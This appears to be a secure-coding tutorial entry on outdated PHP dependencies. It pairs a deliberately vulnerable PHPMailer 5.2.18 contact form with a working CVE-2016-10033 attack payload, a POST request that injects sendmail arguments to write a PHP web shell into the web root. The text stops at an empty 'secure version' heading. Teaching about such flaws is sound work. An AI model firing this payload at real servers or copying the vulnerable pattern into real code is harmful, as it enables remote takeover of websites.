Using outdated PHP dependencies is extremely dangerous. The PHPMailer vulnerability (CVE-2016-10033) affected millions of websites and allowed attackers to execute arbitrary commands on servers through a simple email form.

**VULNERABLE CODE**:

```php
<?php
// composer.json with outdated, vulnerable dependencies
/*
{
    "require": {
        "phpmailer/phpmailer": "5.2.18",
        "guzzlehttp/guzzle": "6.3.0",
        "symfony/http-foundation": "3.4.0",
        "monolog/monolog": "1.23.0"
    }
}
*/

require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;

class ContactForm {
    public function sendMessage($name, $email, $message) {
        $mail = new PHPMailer();

        // VULNERABLE: User input directly in setFrom without validation
        $mail->setFrom($email, $name);
        $mail->addAddress('admin@company.com');
        $mail->Subject = 'Contact Form Submission';
        $mail->Body = $message;

        // Uses mail() transport which is vulnerable in PHPMailer < 5.2.20
        if (!$mail->send()) {
            return false;
        }
        return true;
    }
}

$form = new ContactForm();
$form->sendMessage($_POST['name'], $_POST['email'], $_POST['message']);
```

**Attack Payload**:
```text
POST /contact.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=Attacker&email="attacker\" -oQ/tmp/ -X/var/www/html/shell.php some"@email.com&message=<?php system($_GET['cmd']); ?>
```

**Why This Is Dangerous**:
- PHPMailer 5.2.18 contains CVE-2016-10033 allowing command injection via email sender
- Guzzle 6.3.0 has request smuggling vulnerabilities (CVE-2022-29248)
- No dependency scanning or version constraints prevent installing vulnerable versions
- User input flows directly into mail functions without sanitization

**SECURE VERSION**:

```php
